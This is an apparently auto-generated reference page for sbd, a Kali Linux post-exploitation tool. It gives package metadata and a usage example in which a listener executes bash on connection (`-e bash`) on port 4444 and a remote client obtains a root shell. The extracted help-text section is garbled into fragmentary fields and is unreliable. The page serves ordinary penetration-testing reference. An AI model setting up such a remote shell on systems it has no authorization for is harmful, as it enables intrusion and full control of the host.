---
tool_id: sbd
title: sbd
categories: ["post-exploitation", "exploitation-tools"]
category_slugs: ["post-exploitation", "exploitation-tools"]
homepage: https://mirrors.kernel.org/gentoo/distfiles/sbd-1.37.tar.gz
repository: 
version: 1.37-1kali5
architectures: any
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-post-exploitation kali-tools-windows-resources"]
icon: images/sbd-logo.svg
source_path: kali-tools\sbd\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.096451
---

# Tool: sbd (sbd)

## Categories
- [post-exploitation](../post-exploitation.md)
- [exploitation-tools](../exploitation-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://mirrors.kernel.org/gentoo/distfiles/sbd-1.37.tar.gz](https://mirrors.kernel.org/gentoo/distfiles/sbd-1.37.tar.gz) |
| Repository |  |
| Version | 1.37-1kali5 |
| Architectures | any |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-post-exploitation kali-tools-windows-resources |
| Icon | images/sbd-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/sbd
- **PackagesInfo**: |
- ****Installed size**: ** `163 KB`
- ****How to install**: ** `sudo apt install sbd`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# sbd -h
- **$Id**: sbd.c,v 1.37 2005/08/21 22:40:47 shadow Exp $
- **connect (tcp)**: sbd [-options] host port
- **listen (tcp)**: sbd -l -p port [-options]
- **options**: []
- **Christophe Devine - http**: //www.cr0.net:8040/) or not
- **default is**: -c on
- **sequence (for e.g. chatting). default is**: -H off
- **unix-like OS specific options**: []
- **-D on|off   fork and run in background (daemonize). default**: -D off


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## sbd Usage Example

On the server, listen for a connection (`-l`) on port 4444 (`-p 4444`), execute bash on connection (`-e bash`) and display verbose output (`-v`) with no name resolution (`-n`).

On the client, connect to the remote server IP address (`192.168.1.202`) and port (`4444`).

```console
root@kali:~# sbd -l -p 4444 -e bash -v -n
listening on port 4444
```

```console
root@kali:~# sbd 192.168.1.202 4444
id
uid=0(root) gid=0(root) groups=0(root)
```


## Source
- Path: kali-tools\sbd\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.096451
